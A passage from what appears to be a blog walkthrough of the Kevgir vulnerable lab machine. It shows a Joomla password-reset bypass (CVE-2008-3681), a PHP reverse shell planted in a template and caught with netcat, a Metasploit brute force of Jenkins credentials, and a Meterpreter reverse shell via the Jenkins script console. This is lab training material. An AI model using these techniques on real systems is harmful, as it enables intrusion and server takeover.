<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>8081/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-generator: Joomla! 1.5 - Open Source Content Management
</span><span class='line'>| http-robots.txt: 14 disallowed entries 
</span><span class='line'>| /administrator/ /cache/ /components/ /images/ 
</span><span class='line'>| /includes/ /installation/ /language/ /libraries/ /media/ 
</span><span class='line'>|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Welcome to the Frontpage</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/8081.jpg" title="joomla" alt="joomla"></p>

<p>It&rsquo;s a Joomla page, so I fired up joomscan. There was a lot of output, I&rsquo;m only showing here the findings I used for exploitation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>* The Exact version found is 1.5.1
</span><span class='line'># 15
</span><span class='line'>Info -&gt; CoreComponent: Joomla Remote Admin Password Change Vulnerability 
</span><span class='line'>Versions Affected: 1.5.5 &lt;= 
</span><span class='line'>Check: /components/com_user/controller.php
</span><span class='line'>Exploit: 1. Go to url : target.com/index.php?option=com_user&view=reset&layout=confirm  2. Write into field "token" char ' and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password 
</span><span class='line'>Vulnerable? Yes</span></code></pre></td></tr></table></div></figure>


<p>This vulnerability is tracked under CVE-2008-3681:</p>

<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>

<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/token.jpg" title="token" alt="password reset bypass"></p>

<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/joomla.jpg" title="joomla" alt="joomla"></p>

<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/template.jpg" title="template" alt="joomla template"></p>

<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nc -vnlp 8888
</span><span class='line'>listening on [any] 8888 ...
</span><span class='line'>connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
</span><span class='line'>Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
</span><span class='line'> 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>/bin/sh: 0: can't access tty; job control turned off
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>


<h2>Jenkins</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>9000/tcp  open  http        Jetty winstone-2.9
</span><span class='line'>| http-robots.txt: 1 disallowed entry 
</span><span class='line'>|_/
</span><span class='line'>|_http-server-header: Jetty(winstone-2.9)
</span><span class='line'>|_http-title: Dashboard [Jenkins]</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/jenkins.jpg" title="jenkins" alt="jenkins dashboard"></p>

<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>

<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
tasks related to building, testing, and delivering or deploying software.</p></blockquote>

<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; info
</span><span class='line'>
</span><span class='line'>       Name: Jenkins-CI Enumeration
</span><span class='line'>     Module: auxiliary/scanner/http/jenkins_enum
</span><span class='line'>    License: Metasploit Framework License (BSD)
</span><span class='line'>       Rank: Normal
</span><span class='line'>
</span><span class='line'>Provided by:
</span><span class='line'>  Jeff McCutchan
</span><span class='line'>
</span><span class='line'>Basic options:
</span><span class='line'>  Name       Current Setting  Required  Description
</span><span class='line'>  ----       ---------------  --------  -----------
</span><span class='line'>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>  RHOSTS                      yes       The target address range or CIDR identifier
</span><span class='line'>  RPORT      80               yes       The target port (TCP)
</span><span class='line'>  SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
</span><span class='line'>  THREADS    1                yes       The number of concurrent threads
</span><span class='line'>  VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>Description:
</span><span class='line'>  This module enumerates a remote Jenkins-CI installation in an 
</span><span class='line'>  unauthenticated manner, including host operating system and Jenkins 
</span><span class='line'>  installation details.</span></code></pre></td></tr></table></div></figure>


<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf auxiliary(jenkins_enum) &gt; exploit
</span><span class='line'>
</span><span class='line'>[+] 192.168.217.128:9000  - Jenkins Version 1.647
</span><span class='line'>[*] /script restricted (403)
</span><span class='line'>[*] /view/All/newJob restricted (403)
</span><span class='line'>[+] http://192.168.217.128:9000/ - /asynchPeople/ does not require authentication (200)
</span><span class='line'>[*] /systemInfo restricted (403)</span></code></pre></td></tr></table></div></figure>


<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/jenkins-admin.jpg" title="jenkins admin" alt="jenkins admin"></p>

<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Module options (auxiliary/scanner/http/jenkins_login):
</span><span class='line'>
</span><span class='line'>   Name              Current Setting                                     Required  Description
</span><span class='line'>   ----              ---------------                                     --------  -----------
</span><span class='line'>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
</span><span class='line'>   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
</span><span class='line'>   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
</span><span class='line'>   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
</span><span class='line'>   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
</span><span class='line'>   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
</span><span class='line'>   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
</span><span class='line'>   PASSWORD                                                              no        A specific password to authenticate with
</span><span class='line'>   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
</span><span class='line'>   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
</span><span class='line'>   RPORT             9000                                                yes       The target port (TCP)
</span><span class='line'>   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
</span><span class='line'>   THREADS           1                                                   yes       The number of concurrent threads
</span><span class='line'>   USERNAME          admin                                               no        A specific username to authenticate as
</span><span class='line'>   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
</span><span class='line'>   USER_AS_PASS      false                                               no        Try the username as the password for all users
</span><span class='line'>   USER_FILE                                                             no        File containing usernames, one per line
</span><span class='line'>   VERBOSE           true                                                yes       Whether to print output for all attempts
</span><span class='line'>   VHOST                                                                 no        HTTP server virtual host</span></code></pre></td></tr></table></div></figure>


<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 192.168.217.128:9000 - Login Successful: admin:hello</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>

<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>

<p>Don&rsquo;t forget to select the target as Linux:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>options
</span><span class='line'>
</span><span class='line'>Module options (exploit/multi/http/jenkins_script_console):
</span><span class='line'>
</span><span class='line'>   Name       Current Setting  Required  Description
</span><span class='line'>   ----       ---------------  --------  -----------
</span><span class='line'>   API_TOKEN                   no        The API token for the specified username
</span><span class='line'>   PASSWORD   hello            no        The password for the specified username
</span><span class='line'>   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
</span><span class='line'>   RHOST      192.168.217.128  yes       The target address
</span><span class='line'>   RPORT      9000             yes       The target port (TCP)
</span><span class='line'>   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
</span><span class='line'>   SRVPORT    8080             yes       The local port to listen on.
</span><span class='line'>   SSL        false            no        Negotiate SSL/TLS for outgoing connections
</span><span class='line'>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
</span><span class='line'>   TARGETURI  /                yes       The path to the Jenkins-CI application
</span><span class='line'>   URIPATH                     no        The URI to use for this exploit (default is random)
</span><span class='line'>   USERNAME   admin            no        The username to authenticate as
</span><span class='line'>   VHOST                       no        HTTP server virtual host
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Payload options (linux/x86/meterpreter/reverse_tcp):
</span><span class='line'>
</span><span class='line'>   Name   Current Setting  Required  Description
</span><span class='line'>   ----   ---------------  --------  -----------
</span><span class='line'>   LHOST  192.168.217.132  yes       The listen address
</span><span class='line'>   LPORT  8080             yes       The listen port
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Exploit target:
</span><span class='line'>
</span><span class='line'>   Id  Name
</span><span class='line'>   --  ----
</span><span class='line'>   1   Linux</span></code></pre></td></tr></table></div></figure>


<p>And a new shell appears!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>msf exploit(jenkins_script_console) &gt; exploit
</span><span class='line'>
</span><span class='line'>[*] Started reverse TCP handler on 192.168.217.132:8080 
</span><span class='line'>[*] Checking access to the script console
</span><span class='line'>[*] Logging in...
</span><span class='line'>[*] 192.168.217.128:9000 - Sending Linux stager...
</span><span class='line'>[*] Sending stage (849108 bytes) to 192.168.217.128
</span><span class='line'>[*] Meterpreter session 1 opened (192.168.217.132:8080 -&gt; 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500
</span><span class='line'>
</span><span class='line'>meterpreter &gt; 
</span><span class='line'>[!] Deleting /tmp/wE472W payload file</span></code></pre></td></tr></table></div></figure>


<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>46201/tcp open  unknown
</span><span class='line'>| fingerprint-strings: 
</span><span class='line'>|   DNSStatusRequest: 
</span><span class='line'>|     Unrecognized protocol:
</span><span class='line'>|   DNSVersionBindReq: 
</span><span class='line'>|     Unrecognized protocol: 
</span><span class='line'>|     version
</span><span class='line'>|_    bind
</span><span class='line'>53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
</span><span class='line'>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span><span class='line'>SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
</span><span class='line'>SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
</span><span class='line'>SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
</span><span class='line'>SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");</span></code></pre></td></tr></table></div></figure>


<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>

<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
TCP/IP and UDP/IP via Java NIO.</p></blockquote>

<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>

<h3>Learn more</h3>

<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ This will be a memorable month -- no  \
</span><span class='line'>\ matter how hard you try to forget it. /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
</feed>
